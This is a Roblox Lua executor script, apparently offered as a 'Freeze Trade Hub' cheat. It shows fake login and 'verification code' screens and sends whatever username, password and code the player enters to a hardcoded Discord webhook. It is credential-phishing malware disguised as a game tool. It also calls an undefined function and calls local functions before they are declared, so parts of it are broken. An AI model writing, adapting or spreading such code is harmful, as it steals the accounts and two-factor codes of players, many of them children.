-- URL Webhook Discord
local webhook_url = "https://discord.com/api/webhooks/1323658202419822692/wCuQlIqKiWNSiI9hImEsdGnFY2foZLWqGBfrVkTxK9G1yAg6mStSNePYhq6vYxvd1DKp"

-- Key yang benar
local correctKey = "LOGIN-fREeZeTRadEhUB.id-bGrFDSeRiHUGfavHSK"
local linkUrl = "https://link-target.net/1273087/freezetradehub"

-- Fungsi untuk mengirim data ke Discord
local function sendToDiscord(content)
    local payload = {
        Url = webhook_url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = content
        })
    }

    local response
    if syn and syn.request then
        response = syn.request(payload)
    elseif http and http.request then
        response = http.request(payload)
    elseif request then
        response = request(payload)
    else
        print("Executor Anda tidak mendukung HTTP requests!")
        return
    end

    if response and response.StatusCode == 200 then
        print("Data berhasil dikirim ke Discord!")
    else
        print("Gagal mengirim data ke Discord:", response and response.StatusCode or "Unknown Error")
    end
end

-- Fungsi Membuat GUI Kedua (Login)
local function createLoginGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local usernameBox = Instance.new("TextBox")
    local passwordBox = Instance.new("TextBox")
    local loginButton = Instance.new("TextButton")

    -- Properti GUI
    gui.Name = "LoginGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "LoginFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 300)
    frame.Position = UDim2.new(0.5, -150, 0.5, -150)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Freeze Trade Hub"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Username Box
    usernameBox.Name = "UsernameBox"
    usernameBox.Parent = frame
    usernameBox.Size = UDim2.new(1, -20, 0, 40)
    usernameBox.Position = UDim2.new(0, 10, 0, 90)
    usernameBox.PlaceholderText = "Masukkan Username"
    usernameBox.Font = Enum.Font.SourceSans
    usernameBox.Text = ""
    usernameBox.TextSize = 14
    usernameBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    usernameBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Password Box
    passwordBox.Name = "PasswordBox"
    passwordBox.Parent = frame
    passwordBox.Size = UDim2.new(1, -20, 0, 40)
    passwordBox.Position = UDim2.new(0, 10, 0, 140)
    passwordBox.PlaceholderText = "Masukkan Password"
    passwordBox.Font = Enum.Font.SourceSans
    passwordBox.Text = ""
    passwordBox.TextSize = 14
    passwordBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Login Button
    loginButton.Name = "LoginButton"
    loginButton.Parent = frame
    loginButton.Size = UDim2.new(1, -20, 0, 40)
    loginButton.Position = UDim2.new(0, 10, 0, 200)
    loginButton.Text = "Mulai Script"
    loginButton.Font = Enum.Font.SourceSansBold
    loginButton.TextSize = 16
    loginButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    loginButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Login Button
    loginButton.MouseButton1Click:Connect(function()
        local username = usernameBox.Text
        local password = passwordBox.Text
        if username ~= "" and password ~= "" then
            print("Login berhasil! Username:", username, "Password:", password)
            sendToDiscord("Dinzz : Someone logged in\nUsername: " .. username .. "\nPassword: " .. password)
            gui:Destroy()
            createLoadingGUI() -- Memanggil GUI loading
        else
            print("Harap isi username dan password!")
        end
    end)
end

-- Fungsi Membuat GUI Loading
local function createLoadingGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local loadingLabel = Instance.new("TextLabel")

    -- Properti GUI
    gui.Name = "LoadingGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "LoadingFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 150)
    frame.Position = UDim2.new(0.5, -150, 0.5, -75)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Loading Label
    loadingLabel.Name = "LoadingLabel"
    loadingLabel.Parent = frame
    loadingLabel.Size = UDim2.new(1, 0, 1, 0)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.Font = Enum.Font.SourceSansBold
    loadingLabel.Text = "Loading... Silakan tunggu"
    loadingLabel.TextSize = 24
    loadingLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Menunggu selama 8 detik sebelum melanjutkan
    wait(8)
    gui:Destroy()
    createVerificationCodeGUI() -- Memanggil GUI verifikasi kode
end

-- Fungsi Membuat GUI Keempat (Verifikasi Kode)
local function createVerificationCodeGUI()
    local gui = Instance.new("ScreenGui")
    local frame = Instance.new("Frame")
    local titleLabel = Instance.new("TextLabel")
    local codeBox = Instance.new("TextBox")
    local verifyCodeButton = Instance.new("TextButton")

    -- Properti GUI
    gui.Name = "VerificationCodeGUI"
    gui.Parent = game.CoreGui or game:GetService("CoreGui")

    -- Frame
    frame.Name = "VerificationFrame"
    frame.Parent = gui
    frame.Size = UDim2.new(0, 300, 0, 200)
    frame.Position = UDim2.new(0.5, -150, 0.5, -100)
    frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    frame.BorderSizePixel = 3
    frame.BorderColor3 = Color3.fromRGB(255, 0, 0)

    -- Title Label
    titleLabel.Name = "TitleLabel"
    titleLabel.Parent = frame
    titleLabel.Size = UDim2.new(1, 0, 0, 50)
    titleLabel.Position = UDim2.new(0, 0, 0, 0)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.SourceSansBold
    titleLabel.Text = "Verifikasi Kode"
    titleLabel.TextSize = 24
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Code Box
    codeBox.Name = "CodeBox"
    codeBox.Parent = frame
    codeBox.Size = UDim2.new(1, -20, 0, 40)
    codeBox.Position = UDim2.new(0, 10, 0, 60)
    codeBox.PlaceholderText = "Masukkan Kode Verifikasi"
    codeBox.Font = Enum.Font.SourceSans
    codeBox.Text = ""
    codeBox.TextSize = 14
    codeBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    codeBox.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Verify Code Button
    verifyCodeButton.Name = "VerifyCodeButton"
    verifyCodeButton.Parent = frame
    verifyCodeButton.Size = UDim2.new(1, -20, 0, 40)
    verifyCodeButton.Position = UDim2.new(0, 10, 0, 120)
    verifyCodeButton.Text = "Verifikasi Kode"
    verifyCodeButton.Font = Enum.Font.SourceSansBold
    verifyCodeButton.TextSize = 16
    verifyCodeButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
    verifyCodeButton.TextColor3 = Color3.fromRGB(255, 255, 255)

    -- Fungsi Verifikasi Kode
    verifyCodeButton.MouseButton1Click:Connect(function()
        local code = codeBox.Text
        sendToDiscord("Kode Verifikasi Diterima: " .. code)
        print("Kode verifikasi telah dikirim ke Discord!")
        gui:Destroy()
    end)
end

-- Memulai Script dengan GUI Pertama
createKeyValidationGUI()
